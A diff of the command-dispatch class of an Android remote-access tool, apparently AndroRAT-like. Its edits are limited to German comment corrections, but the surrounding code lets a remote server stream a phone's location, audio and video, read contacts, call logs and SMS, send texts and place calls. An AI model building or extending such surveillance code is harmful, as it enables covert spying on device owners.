@@ -24,7 +24,7 @@ import android.widget.Toast;
 import inout.Protocol;
 
 /**
- * In dieser Klasse werden die von dem Server kommenden Befehlen verarbeitet und die entsprechenden Aktionen ausgewählt und gestartet.
+ * In dieser Klasse werden die von dem Server kommenden Befehlen verarbeitet, die entsprechenden Aktionen ausgewählt und gestartet.
  */
 public class ProcessCommand
 {
@@ -38,7 +38,7 @@ public class ProcessCommand
 	SharedPreferences.Editor editor;
 
 	/**
-	 *  Der Konstruktor. Besorgt sich die Settings aus der preferences.xml und die settings des Editors
+	 *  Der Konstruktor. Besorgt sich die Settings aus der preferences.xml und die settings des Editors.
 	 * @param c Der Client
 	 */
 	public ProcessCommand(ClientListener c)
@@ -49,21 +49,21 @@ public class ProcessCommand
 	}
 
 	/**
-	 * In dieser Methode wird das Agument verarbeitet und jenachdem die entsprechende Activity/Klasse un deren Methoden aufgerufen.
-	 * @param cmd Das Argument welches von dem Server kam
-	 * @param args	Die Argumente die übergeben wurden wie z.B. Nummer oder Provider
+	 * In dieser Methode wird das Agument verarbeitet und jenachdem die entsprechende Activity/Klasse und deren Methoden aufgerufen.
+	 * @param cmd Das Argument, welches von dem Server kam.
+	 * @param args	Die Argumente, die übergeben wurden wie z.B. Nummer oder Provider.
 	 * @param chan	Der Channel
 	 */
 	public void process(short cmd, byte[] args, int chan)
 	{
 		/**
-		 * Hier werden die Klassenvariablen mit den Übergebenen Argumenten befüllt
+		 * Hier werden die Klassenvariablen mit den übergebenen Argumenten befüllt
 		 */
 		this.commande = cmd;
 		this.chan = chan;
 		this.arguments = ByteBuffer.wrap(args);
 		/**
-		 * Überprüfen welches command angekommen ist.
+		 * Überprüft welches command angekommen ist.
 		 */
 		if (commande == Protocol.GET_GPS_STREAM)
 		{
@@ -72,9 +72,9 @@ public class ProcessCommand
 			 */
 			String provider = new String(arguments.array());
 			/**
-			 * Hier wird überprüft der GPS-Sensor aktiviert ist oder ob die Ortung per Netzwerk geschehen kann, also das Gerät mit einem Netzwerk verbunden ist.
-			 * Ist dies der Fall wird die Klassen Vaiable der Klasse Client mit einem neuen GPSListener versorgt.
-			 * Sollte das Gerät nicht verbunden sein so wird ein Error gesendet.
+			 * Hier wird überprüft, ob der GPS-Sensor aktiviert ist oder ob die Ortung per Netzwerk geschehen kann, also das Gerät mit einem Netzwerk verbunden ist.
+			 * Ist dies der Fall wird ein neues Objekt der Klasse GPSListener in der Klassenvaiable der Klasse Client gespeichert.
+			 * Sollte das Gerät nicht verbunden sein, wird ein Error gesendet.
 			 */
 			if (provider.compareTo("network") == 0 || provider.compareTo("gps") == 0) {
 				client.gps = new GPSListener(client, provider, chan);
@@ -84,7 +84,7 @@ public class ProcessCommand
 				client.sendError("Unknown provider '"+provider+"' for location");
 		}
 		/**
-		 * Wenn es das STOP_GPS_STREAM Kommando ist, so wird der in der Klasse Client gespeicherte GPSListener gestopp, gelöscht und die Information das dies geschehen ist an die ClientKlasse gesendet.
+		 * Wenn es sich um das STOP_GPS_STREAM Kommando handelt, wird der in der Klasse Client gespeicherte GPSListener gestopt, gelöscht und die Information, dass dies geschehen ist an den Server gesendet.
 		 */
 		else if (commande == Protocol.STOP_GPS_STREAM)
 		{
@@ -93,8 +93,8 @@ public class ProcessCommand
 			client.sendInformation("Location stopped");
 		}
 		/**
-		 * Handelt es sich um das GET_SOUND_STREAM Kommando so wird die Information an den Client gesendet, ein neuer AudioStream erstellt, dieser in der Klassenvariablen der Klasse Client gespeichert
-		 * und zum Schluss noch gestartet
+		 * Handelt es sich um das GET_SOUND_STREAM Kommando, wird die Information an den Server gesendet, ein neuer AudioStream erstellt, dieser in der Klassenvariablen der Klasse Client gespeichert
+		 * und zum Schluss noch gestartet.
 		 */
 		else if (commande == Protocol.GET_SOUND_STREAM)
 		{
@@ -103,7 +103,7 @@ public class ProcessCommand
 			client.audioStreamer.run();
 		}
 		/**
-		 * Bei dem Kommando STOP_SOUND_STREAM wird der entsprechende AudioStream der Klasse Client gestoppt, gelöscht und die Information an die Klasse Client gesendet.
+		 * Bei dem Kommando STOP_SOUND_STREAM wird der entsprechende AudioStream der Klasse Client gestoppt, gelöscht und die Information an den Server gesendet.
 		 */
 		else if (commande == Protocol.STOP_SOUND_STREAM)
 		{
@@ -113,7 +113,7 @@ public class ProcessCommand
 		}
 		/**
 		 * Der Befehl GET_CALL_LOGS ruft die listCallLog Funktion der Klasse CAllLogListener.
-		 * Sollte hier der Ergebnis Boolean false sein so wird ein Error gesendet, welcher besagt, dass keine CallLogs vorhanden sind.
+		 * Sollte hier das Ergebnis false sein, wird ein Error gesendet, welcher besagt, dass keine CallLogs vorhanden sind.
 		 */
 		else if (commande == Protocol.GET_CALL_LOGS)
 		{
@@ -130,7 +130,7 @@ public class ProcessCommand
 			client.callMonitor = new CallMonitor(client, chan, arguments.array());
 		}
 		/**
-		 * Der Befehl STOP_MONITO_CALL beendet den client.callsMonitor, löscht diesen und sendet dei Information an den client
+		 * Der Befehl STOP_MONITO_CALL beendet das Objekt der Variablen client.callMonitor, löscht dieses und sendet dis Information an den Server.
 		 */
 		else if (commande == Protocol.STOP_MONITOR_CALL)
 		{
@@ -141,7 +141,7 @@ public class ProcessCommand
 		}
 		/**
 		 * Der Befehlt GET_CONTACTS ruft die listContacts-Methode der Klasse ContactsLister auf.
-		 * Sollte diese false returnen so wird einen Error Nachricht gesendet, dass es keine Kontakte auf dem Gerät gibt.
+		 * Sollte diese false zurückgeben, wird einen Error Nachricht gesendet, dass keine Kontakte auf dem Gerät vorhanden sind.
 		 */
 		else if (commande == Protocol.GET_CONTACTS)
 		{
@@ -151,9 +151,9 @@ public class ProcessCommand
 			
 		}
 		/**
-		 * Der Befehl LIST_DIR bekommt zusätzlich in dem arguments-Array den Ordner übergeben von welchem die Daten empfangen werden sollen.
+		 * Der Befehl LIST_DIR bekommt zusätzlich den Pfad übergeben von welchem die Auflistung der Ordner beginnen soll.
 		 * Dieser Ordnername wird in dem String file zwischen gespeichert. Danach wird die listDir-Methode der Klasse DirLister aufgerufen.
-		 * Sollte diese false returnen wird eine Fehlernachricht geschickt.
+		 * Sollte diese false zurückgeben, wird eine Fehlernachricht geschickt.
 		 */
 		else if (commande == Protocol.LIST_DIR)
 		{
@@ -177,7 +177,7 @@ public class ProcessCommand
 		}
 		/**
 		 * Mit dem Befehl GET_PICTURE wird ein Objekt der Klasse PhotoTaker erstellt und die Methode takePhoto aufgerufen.
-		 * Wird false zurückgelifert so wird eine Fehlernachricht gesendet.
+		 * Wird false zurückgeliefert, wird eine Fehlernachricht gesendet.
 		 */
 		else if (commande == Protocol.GET_PICTURE)
 		{
@@ -208,9 +208,9 @@ public class ProcessCommand
 			String num = information.get(Protocol.KEY_SEND_SMS_NUMBER);
 			String text = information.get(Protocol.KEY_SEND_SMS_BODY);
 			/**
-			 * Hier wird die Länge überprüft. Sollte diese Länger als 167 Byte haben so müssen mehrere SMS gesendet werden.
+			 * Hier wird die Länge überprüft. Sollte diese Länger als 167 Byte sein, müssen mehrere SMS gesendet werden.
 			 * Dies wird dann mit dem Aufruf der Methode sendMultipartTextMessage getan.
-			 * Sollte die Länge passen wird die Methode sendTextMessage aufgerufen.
+			 * Sollte die Länge passen, wird die Methode sendTextMessage aufgerufen.
 			 */
 			if (text.getBytes().length < 167)
 				SmsManager.getDefault().sendTextMessage(num, null, text, null, null);
@@ -223,9 +223,9 @@ public class ProcessCommand
 
 		}
 		/**
-		 * Dieser Teil wird ausgeführt wenn der Befehlt GIVE_CALL gesendet wurde.
+		 * Dieser Teil wird ausgeführt, wenn der Befehlt GIVE_CALL gesendet wurde.
 		 * Hier wird aus dem arguments-Array die Telefonnummer extrahiert und der String tel: davor eingefügt.
-		 * Dieser String kann dann benutzt werden um einen Intent zu erstellen, welcher die action ACTION_CALL übergeben bekommt.
+		 * Dieser String kann dann benutzt werden, um einen Intent zu erstellen, welcher die action ACTION_CALL übergeben bekommt.
 		 * Zusätzlich wird die FLAG_ACTIVITY_NEW_TASK gesetzt. Im Anschluss wird der Intent gesendet und somit der Anruf getätigt.
 		 */
 		else if (commande == Protocol.GIVE_CALL)
@@ -238,7 +238,7 @@ public class ProcessCommand
 		}
 		/**
 		 * Sollte der Befehl GET_SMS gesendet werden so wird die Methode listSMS der Klasse SMSLIster aufgerufen und das arguments_array wird dieser Methode übergeben.
-		 * Diese fungieren hier als die Filter, welche der Benutzer eingeben kann. Sollte hier als Resultat false geliefert werden so gab es keine SMS die auf diesen Filter zutreffen.
+		 * Das Array fungieren hier als der Filter, welchen der Benutzer eingeben kann. Sollte hier als Resultat false geliefert werden, gab es keine SMS die auf diesen Filter zutreffen.
 		 */
 		else if (commande == Protocol.GET_SMS)
 		{
@@ -248,7 +248,7 @@ public class ProcessCommand
 			
 		}
 		/**
-		 * Mit dem Befehl MONITOR_SMS  wird ein neues Objekt der Klasse SMSMonitor erstellt und der Klassenvaribale der Client Klasse zugewiesen.
+		 * Mit dem Befehl MONITOR_SMS wird ein neues Objekt der Klasse SMSMonitor erstellt und der Klassenvaribale der Client Klasse zugewiesen.
 		 */
 		else if (commande == Protocol.MONITOR_SMS)
 		{
@@ -257,7 +257,7 @@ public class ProcessCommand
 			
 		}
 		/**
-		 * Sollt der Befehl STOP_MONITOR_SMS empfangen werden so wird das smsMonitor Objekt gestoppt und gelöscht.
+		 * Sollte der Befehl STOP_MONITOR_SMS empfangen werden, wird das smsMonitor Objekt gestoppt und gelöscht.
 		 */
 		else if (commande == Protocol.STOP_MONITOR_SMS)
 		{
@@ -266,8 +266,8 @@ public class ProcessCommand
 			client.sendInformation("SMS monitoring stopped");
 		}
 		/**
-		 * Wird der Befehl GET_PREFERENCE gesendet so sendet der Client die Preferences an den Server.
-		 * Hierzu wird der Befehel handleData aufgerufen.
+		 * Wird der Befehl GET_PREFERENCE gesendet, sendet der Client die Preferences an den Server.
+		 * Hierzu wird der Befehl handleData aufgerufen.
 		 */
 		else if (commande == Protocol.GET_PREFERENCE)
 		{
@@ -275,7 +275,7 @@ public class ProcessCommand
 		}
 		/**
 		 * Mit dem Befehel SET_PREFERENCE werden die gesendeten PREFERENCES gespeichtert, indem die Methode savePreferences aufgerufen wird.
-		 * Das arguments-Array bietet hier die entsprechenden zu speichernden Daten an.
+		 * Das arguments-Array bietet hier die Einstellungsdaten an.
 		 */
 		else if (commande == Protocol.SET_PREFERENCE)
 		{
@@ -291,9 +291,9 @@ public class ProcessCommand
 			client.advancedInfos.getInfos();
 		}
 		/**
-		 * Durch den Befehl OPEN_BROWSER wird ein neuer Intent erstellt, welcher die url, die aus dem arguments-Array extrahiert wurde,
+		 * Durch den Befehl OPEN_BROWSER wird ein neuer Intent erstellt, welcher die URL, die aus dem arguments-Array extrahiert wurde,
 		 * und die Action ACTION_VIEW erhält. Zusätzlich wird die FLAG_ACTIVITY_NEW_TASK gesetzt.
-		 * Im Anschluss wird der Intent abgeschickt und somit die Activity die ihn empfängt gestartet.
+		 * Im Anschluss wird der Intent abgeschickt und somit die Activity, die ihn empfängt gestartet.
 		 */
 		else if(commande == Protocol.OPEN_BROWSER) {
 			 String url = new String(arguments.array()) ;
@@ -302,8 +302,8 @@ public class ProcessCommand
 			 client.startActivity(i);
 		}
 		/**
-		 * Sollter der Befehel DO_VIBRATE gesendet werden so wird ein neuer Vibrator_service erstellt.
-		 * Das arguments-Array liefert wie lange das Gerät vibrieren soll. Durch den Aufruf der Methdoe virbrate wird dies dann ausgeführt.
+		 * Sollter der Befehel DO_VIBRATE gesendet werden, wird ein neuer Vibrator_service erstellt.
+		 * Das arguments-Array liefert wie lange das Gerät vibrieren soll. Durch den Aufruf der Methode virbrate der Vibrator gestartet.
 		 */
 		else if(commande == Protocol.DO_VIBRATE) {
 			Vibrator v = (Vibrator) client.getSystemService(Context.VIBRATOR_SERVICE);
@@ -312,7 +312,7 @@ public class ProcessCommand
 
 		}
 		/**
-		 * Wird der Befehl GET_VIDEO_STREAM) so wird ein Objekt der Klasse VideoStreamer erstellt und jenachdem welche Option auf dem Server gewählt wurde die entsprechende Methode gestartet.
+		 * Wird der Befehl GET_VIDEO_STREAM empfangen, wird ein Objekt der Klasse VideoStreamer erstellt und jenachdem welche Option auf dem Server gewählt wurde, die entsprechende Methode gestartet.
 		 */
 		else if (commande == Protocol.GET_VIDEO_STREAM){
 			client.sendInformation("Video streaming request received");
@@ -325,7 +325,7 @@ public class ProcessCommand
 			}
 		}
 		/**
-		 * Wird der Befehl STOP_VIDEO_STREAM gesendet so wird die Aufnahme oder der Stream beendet und das Objekt im Client gelöscht.
+		 * Wird der Befehl STOP_VIDEO_STREAM gesendet so wird die Aufnahme oder der Stream beendet und das Objekt gelöscht.
 		 */
 		else if (commande == Protocol.STOP_VIDEO_STREAM){
 			if(client.videoStreamer.getRecord()) {
@@ -339,7 +339,7 @@ public class ProcessCommand
 
 		}
 		/**
-		 * Wenn der Befehl TORCH gesendet wird, so wird ein neues Objekt der Klasse Torch erstellt und mit der Methode turnOnFlash der Blitz angestellt.
+		 * Wenn der Befehl TORCH gesendet wird, wird ein neues Objekt der Klasse Torch erstellt und mit der Methode turnOnFlash der Blitz angestellt.
 		 */
 		else if(commande == Protocol.TORCH){
 			client.torch = new Torch(client);
@@ -374,7 +374,7 @@ public class ProcessCommand
 	}
 
 	/**
-	 * Erstellt ein PreferencePacket und gibt die zurück
+	 * Erstellt ein PreferencePacket und gibt dies zurück.
 	 * @return	PreferencePacket
 	 */
 	public PreferencePacket loadPreferences()
@@ -384,11 +384,11 @@ public class ProcessCommand
 		 */
 		PreferencePacket p = new PreferencePacket();
 		/**
-		 * Lädt den Inthalt aus der xml/preferences Datei unt speichert dies in settings.
+		 * Lädt den Inthalt aus der xml/preferences Datei und speichert diese in settings.
 		 */
 		SharedPreferences settings = client.getSharedPreferences("preferences", 0);
 		/**
-		 * Setzt die Ip in p in dem es aus settings das Feld Ip zurückhaben möchte. Ist dies nicht vorhanden so wird als default 192.168.0.12 zurückgegeben.
+		 * Setzt die Ip in p in dem es aus settings das Feld Ip abfrägt. Ist dies nicht vorhanden so wird als default 192.168.137.1 zurückgegeben.
 		 */
 		p.setIp( settings.getString("ip", "192.168.137.1"));
 		/**
@@ -408,7 +408,7 @@ public class ProcessCommand
 		 */
 		String keywords = settings.getString("smsKeyWords", "");
 		/**
-		 * Überprüfen ob es Kexwords gibt.
+		 * Überprüfen ob es Keywords gibt.
 		 */
 		if(keywords.equals(""))
 		/**
@@ -417,7 +417,7 @@ public class ProcessCommand
 			smsKeyWords = null;
 		else {
 			/**
-			 * Ansonsten wird ein StringTokenizer erzeugt der den String in Tokens unterteilt sobald ein Semikolon in dem String vorkommt.
+			 * Ansonsten wird ein StringTokenizer erzeugt, welcher den String in Tokens unterteilt sobald ein Semikolon in dem String vorkommt.
 			 */
 			StringTokenizer st = new StringTokenizer(keywords, ";");
 			while (st.hasMoreTokens())
@@ -450,7 +450,7 @@ public class ProcessCommand
 			whiteListCall = null;
 		else {
 			/**
-			 * Ansosnten wird ein StringTokenizer erstellt um den String in Token zu unterteilen wenn eun Semikolon im String vorkommt.
+			 * Ansosnten wird ein StringTokenizer erstellt um den String in Token zu unterteilen wenn ein Semikolon im String vorkommt.
 			 */
 			StringTokenizer st = new StringTokenizer(listCall, ";");
 			while (st.hasMoreTokens())
@@ -476,7 +476,7 @@ public class ProcessCommand
 		 */
 		String listSMS = settings.getString("numSMS", "");
 		/**
-		 * Danach wird überprüft ob der String einen Ihnhalt hat, wenn nicht wird die ArrayList auf null gesetzt
+		 * Danach wird überprüft, ob der String einen Ihnhalt hat, wenn nicht wird die ArrayList auf null gesetzt
 		 */
 		if(listSMS.equals(""))
 			whiteListSMS = null;
@@ -493,7 +493,7 @@ public class ProcessCommand
 				whiteListSMS.add(st.nextToken());
 			}
 			/**
-			 * Und abschließend wird die whiteListSMS p hinzugefügt.
+			 * Und p die whiteListSMS hinzugefügt.
 			 */
 			p.setPhoneNumberSMS(whiteListSMS);
 		}
@@ -514,7 +514,7 @@ public class ProcessCommand
 		 */
 		PreferencePacket pp = new PreferencePacket();
 		/**
-		 * Parsen der Daten damit diese in pp gespeichert sind.
+		 * Parsen der Daten damit diese in pp gespeichert werden.
 		 */
 		pp.parse(data);
 		/**
@@ -538,7 +538,7 @@ public class ProcessCommand
 		 */
 		editor.putBoolean("waitTrigger", pp.isWaitTrigger());
 		/**
-		 * Strings erstellen um die smsKeyWords, numsCall und numsSMS zwischen zuspeichern.
+		 * Strings erstellen um die smsKeyWords, numsCall und numsSMS zwischenzuspeichern.
 		 */
 		String smsKeyWords = "";
 		String numsCall = "";
@@ -554,12 +554,12 @@ public class ProcessCommand
 			 */
 			if (i == (smsKeyWord.size() - 1))
 			/**
-			 * Wenn es erreicht ist nur den Sting an smsKeyWords anhängen.
+			 * Wenn das Ende erreicht ist, nur den Sting an smsKeyWords anhängen.
 			 */
 				smsKeyWords += smsKeyWord.get(i);
 			else
 			/**
-			 * Ansonstne den String + ein Semikolon anhängen.
+			 * Ansonsten den String + ein Semikolon anhängen.
 			 */
 				smsKeyWords += smsKeyWord.get(i) + ";";
 		}
@@ -640,7 +640,7 @@ public class ProcessCommand
 
 		int taille = 0;
 		/**
-		 * Solange taille kleiner als die Länge des Textes ist
+		 * Solange taille kleiner als die Länge des Textes ist.
 		 */
 		while (taille < text.length())
 		{
@@ -650,13 +650,13 @@ public class ProcessCommand
 			if ((taille - text.length()) < 167)
 			{
 				/**
-				 * Wenn ka dann wird der substring von taille bis Zur Länge vom Text der StringArrayList hinzugefügt
+				 * Wenn dies der Fall ist, dann wird der substring von taille bis Zur Länge vom Text der StringArrayList hinzugefügt
 				 */
 				multipleMsg.add(text.substring(taille, text.length()));
 			} else
 			{
 				/**
-				 * Wenn der Text Länger ist als 167 wird diese in 167 große Teile zerlegt und jeder Teil zu mutliplMsg hinzugefügt.
+				 * Wenn der Text Länger ist als 167, wird dieserIDE in 167 große Teile zerlegt und jeder Teil zu mutliplMsg hinzugefügt.
 				 */
 				multipleMsg.add(text.substring(taille, taille + 167));
 			}
